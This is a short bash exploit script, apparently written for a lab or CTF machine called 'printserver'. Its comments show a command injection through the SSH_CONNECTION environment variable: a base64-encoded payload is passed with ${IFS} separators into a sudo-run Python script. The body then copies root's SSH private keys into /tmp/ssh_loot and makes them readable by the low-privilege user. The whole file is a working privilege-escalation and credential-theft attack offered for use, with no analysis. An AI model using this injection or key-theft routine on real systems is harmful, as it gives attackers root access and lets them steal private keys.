#!/bin/bash

# @ vpn@printserver  
# injection script to copy root's ssh-keys to /tmp/ssh_loot with vpn's permissions
# used with /usr/local/bin/vpn.py @ vpn@printserver  

# execute
# INJECT=$(echo -n "./inject.sh" | base64) # -n = no newlineat end like \n
# export SSH_CONNECTION="fe80::1%eth0;echo\${IFS}${INJECT}\$|base64\${IFS}-d|sh; 1 fe80::1 1"
# sudo /usr/local/bin/vpn.py

# script to be place here:
# [ζ] vpn@printserver:~$ ls -alh
# -rwxrwxr-x 1 vpn  vpn   344 Feb 27 13:14 inject.sh

# remember to set execute persmission on the script
# chmod +x ~/inject.sh

echo "hello from inject.sh"

# Create a destination and copy everything
mkdir -p /tmp/ssh_loot
cp -r /root/.ssh/* /tmp/ssh_loot/

# Fix permissions so 'vpn' user owns the copies
chown -R vpn:vpn /tmp/ssh_loot
chmod -R 644 /tmp/ssh_loot/*

echo "SSH keys copied to /tmp/ssh_loot"
ls -la /tmp/ssh_loot

echo "goodbye from inject.sh"

